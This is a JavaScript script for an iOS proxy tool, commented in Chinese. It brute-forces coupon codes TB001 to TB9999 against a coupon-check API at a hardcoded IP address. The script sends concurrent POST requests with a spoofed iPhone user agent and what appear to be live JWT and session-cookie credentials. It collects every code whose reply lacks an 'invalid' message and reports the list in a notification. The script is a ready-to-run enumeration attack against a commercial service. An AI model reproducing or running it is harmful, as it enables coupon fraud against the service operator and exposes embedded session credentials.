// ====== 配置 ======
const START = 1;
const END = 9999;
const PLAN_ID = 1;  // 基础6
const CONCURRENCY = 3;  // 每批并发数量
const TIMEOUT = 10000;  // 每条请求超时时间 ms

// 固定信息
const url = `http://154.17.5.149:12325/api/v1/user/coupon/check`;
const headers = {
    'Connection': 'keep-alive',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Language': 'zh-CN',
    'Content-Type': 'application/json;charset=utf-8',
    'Origin': 'http://154.17.5.149:12325',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NTEwODAxLCJzZXNzaW9uIjoiNDhhZTZhMmQ1MzhjYjNkOWMyNTc5MzVlYjA1ODEyNGIifQ.caRj4SNBr2KQgkXyUXPe4tc-us3siMtFIX8aa_pZ-NA',
    'Cookie': '_ss_s_uid=96baefca1fccfc5413b0024f678d37fb; authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NTEwODAxLCJzZXNzaW9uIjoiNDhhZTZhMmQ1MzhjYjNkOWMyNTc5MzVlYjA1ODEyNGIifQ.caRj4SNBr2KQgkXyUXPe4tc-us3siMtFIX8aa_pZ-NA',
    'Host': `154.17.5.149:12325`,
    'Referer': `http://154.17.5.149:12325/`,
    'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
    'Accept': 'application/json, text/plain, */*'
};

// ====== 工具函数 ======
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function generateCode(i) {
    const num = i.toString();
    if (num.length === 1) return "TB00" + num;
    if (num.length === 2) return "TB0" + num;
    if (num.length === 3) return "TB" + num;
    return "TB" + num;
}

// fetch 带超时保护
function fetchWithTimeout(req, timeout = TIMEOUT) {
    return Promise.race([
        $task.fetch(req),
        new Promise((_, reject) => setTimeout(() => reject("请求超时"), timeout))
    ]);
}

// ====== 主逻辑 ======
(async () => {

    let validCodes = [];

    console.log("==== 并发优惠码扫描启动 ====");
    console.log(`范围：TB001 至 TB9999, plan_id: ${PLAN_ID}`);
    console.log(`每批并发：${CONCURRENCY} 条`);
    console.log("================================");

    for (let batchStart = START; batchStart <= END; batchStart += CONCURRENCY) {

        let tasks = [];
        let batchCodes = [];

        for (let i = 0; i < CONCURRENCY; i++) {
            let index = batchStart + i;
            if (index > END) break;

            let code = generateCode(index);
            batchCodes.push(code);

            let body = JSON.stringify({
                code: code,
                plan_id: PLAN_ID
            });

            let req = {
                url: url,
                method: "POST",
                headers: headers,
                body: body
            };

            let task = fetchWithTimeout(req).then(resp => {
                let text = resp.body || "";
                let obj = {};
                try { obj = JSON.parse(text); } catch (e) {}
                // 返回值中没有 "无效" 视为有效
                if (!(obj.message && obj.message.includes("无效"))) {
                    validCodes.push({ code, response: text });
                    return { code, valid: true, text };
                }
                return { code, valid: false };
            }).catch(err => {
                console.log(`优惠码 ${code} 请求失败: ${err}`);
                return { code, valid: false };
            });

            tasks.push(task);
        }

        // 等待批次全部完成
        let results = await Promise.all(tasks);

        // 批次日志
        let validInBatch = results.filter(r => r.valid);
        if (validInBatch.length === 0) {
            console.log(`批次 ${batchCodes[0]}-${batchCodes[batchCodes.length-1]}：无有效优惠码`);
        } else {
            validInBatch.forEach(v => {
                console.log(`批次发现有效优惠码: ${v.code} → ${v.text}`);
            });
        }

        await sleep(50); // 每批间稍微休息
    }

    console.log("\n==== 扫描完成 ====\n");

    // 最终通知
    if (validCodes.length === 0) {
        $notify("扫描完成", "未找到有效优惠码", "");
    } else {
        $notify(
            "扫描完成",
            `共找到 ${validCodes.length} 个有效优惠码`,
            validCodes.map(v => v.code).join(", ")
        );
    }

    $done();
})();
